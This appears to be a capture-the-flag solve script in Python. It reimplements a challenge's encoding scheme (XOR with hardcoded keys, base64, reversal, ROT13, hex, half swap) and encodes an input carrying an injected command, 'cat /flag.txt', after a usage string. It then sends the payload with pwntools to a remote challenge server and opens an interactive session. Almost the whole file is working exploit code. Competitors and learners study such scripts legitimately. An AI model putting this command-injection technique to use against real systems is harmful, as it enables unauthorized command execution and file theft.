from base64 import b64encode
import string

def encrypt(plaintext: str) -> str:
    data = plaintext.encode()

    for _ in range(2):
        # XOR with 2 keys
        key1 = b'gGIghgQHUGadFAHVGFIUsaddwg'
        key2 = b'DBDabASsjnBajhvjhDShuGdvW'
        data = bytes([c ^ key1[i % len(key1)] ^ key2[i % len(key2)] for i, c in enumerate(data)])

        # Base64 encode
        data = b64encode(data)

        # Reverse
        data = data[::-1]

        # ROT13
        lc = string.ascii_lowercase
        uc = string.ascii_uppercase
        rot13_tbl = {lc[i]: lc[(i + 13) % 26] for i in range(26)} | {uc[i]: uc[(i + 13) % 26] for i in range(26)}
        data = "".join([rot13_tbl[c] if c in string.ascii_letters else c for c in data.decode()]).encode()

    # Convert to hex
    hex_data = data.hex()

    # Swap halves
    swapped = hex_data[96:] + hex_data[:96]

    return swapped

from pwn import *

cmd = "echo gg; cat /flag.txt;"
plaintext = f"Usage: ./chall {cmd}"

while True:
    payload = encrypt(plaintext)
    if len(payload) < 192:
        plaintext += "#"
        continue

    print(f"Payload: {payload}")
    break

#p = process("./challenge/chall")
p = remote("access-code.challs.infobahnc.tf", 1337)
p.sendlineafter(b"code: ", payload.encode())

p.interactive()
p.close()
